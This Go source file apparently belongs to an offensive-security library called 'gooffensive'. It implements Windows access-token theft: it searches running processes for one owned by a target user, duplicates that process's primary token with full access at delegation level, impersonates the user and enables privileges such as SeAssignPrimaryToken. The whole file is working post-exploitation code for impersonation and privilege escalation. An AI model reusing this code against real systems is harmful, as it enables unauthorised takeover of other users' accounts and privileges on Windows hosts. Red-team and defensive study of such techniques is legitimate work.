package token

import (
	"log"
	"syscall"
	"unsafe"

	"github.com/gooffensive/gooffensive/pkg/gooffensive/process"
	"golang.org/x/sys/windows"
)

const (
	SE_PRIVILEGE_ENABLED   = uint32(0x00000002)
	SecurityAnonymous      = 0
	SecurityIdentification = 1
	SecurityImpersonation  = 2
	SecurityDelegation     = 3
	TokenPrimary           = 1
	TokenImpersonation     = 2
	SYNCHRONIZE            = 0x00100000
)

// ImpersonateUser loops over all the running process and calls ImpersonateProcess
// in an attempt to retrieve a token belonging to the `username` user.
func ImpersonateUser(username string) (newToken syscall.Token, err error) {
	p, err := process.GetProcesses()
	if err != nil {
		return
	}
	for _, proc := range p {
		if proc.Owner == username {
			newToken, err = ImpersonateProcess(proc.Pid)
			if err != nil {
				// Couldn't grab the token
				continue
			} else {
				// Got token
				return
			}
		}
	}
	return
}

// ImpersonateProcess duplicates a primary token belonging to a process.
func ImpersonateProcess(pid uint32) (newToken syscall.Token, err error) {
	var attr syscall.SecurityAttributes
	var requiredPrivileges = []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"}
	primaryToken, err := getPrimaryToken(pid)

	if err != nil {
		log.Println("getPrimaryToken failed:", err)
		return
	}
	defer primaryToken.Close()

	err = impersonateLoggedOnUser(*primaryToken)
	if err != nil {
		log.Println("impersonateLoggedOnUser failed:", err)
		return
	}
	err = duplicateTokenEx(*primaryToken, syscall.TOKEN_ALL_ACCESS, &attr, SecurityDelegation, TokenPrimary, &newToken)
	if err != nil {
		log.Println("duplicateTokenEx failed:", err)
		return
	}
	for _, priv := range requiredPrivileges {
		err = SePrivEnable(priv)
		if err != nil {
			log.Println("Failed to set priv", priv)
			return
		}
	}
	return
}

// SePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
func SePrivEnable(s string) error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LuidAndAttributes struct {
		Luid       LUID
		Attributes uint32
	}
	type TokenPrivileges struct {
		PrivilegeCount uint32
		Privileges     [1]LuidAndAttributes
	}

	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, e := procLookupPriv.Call(
		uintptr(0), //LPCWSTR lpSystemName,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
	)
	if r == 0 {
		return e
	}
	privs := TokenPrivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if r == 0 {
		return e
	}
	return nil
}

// Helper functions

func getPrimaryToken(pid uint32) (*syscall.Token, error) {
	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		log.Println("OpenProcess failed")
		return nil, err
	}
	defer syscall.CloseHandle(handle)
	var token syscall.Token
	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_DUPLICATE|syscall.TOKEN_ASSIGN_PRIMARY|syscall.TOKEN_QUERY, &token); err != nil {
		log.Println("OpenProcessToken failed")
		return nil, err
	}
	return &token, err
}

func impersonateLoggedOnUser(hToken syscall.Token) (err error) {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procImpersonateLoggedOnUser := modadvapi32.MustFindProc("ImpersonateLoggedOnUser")
	r1, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
	if r1 != 0 {
		return nil
	}
	return
}

func duplicateTokenEx(hExistingToken syscall.Token, dwDesiredAccess uint32, lpTokenAttributes *syscall.SecurityAttributes, impersonationLevel uint32, tokenType uint32, phNewToken *syscall.Token) (err error) {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procDuplicateTokenEx := modadvapi32.MustFindProc("DuplicateTokenEx")
	r1, _, err := procDuplicateTokenEx.Call(
		uintptr(hExistingToken),
		uintptr(dwDesiredAccess),
		uintptr(unsafe.Pointer(lpTokenAttributes)),
		uintptr(impersonationLevel),
		uintptr(tokenType),
		uintptr(unsafe.Pointer(phNewToken)),
	)
	if r1 != 0 {
		return nil
	}
	return
}
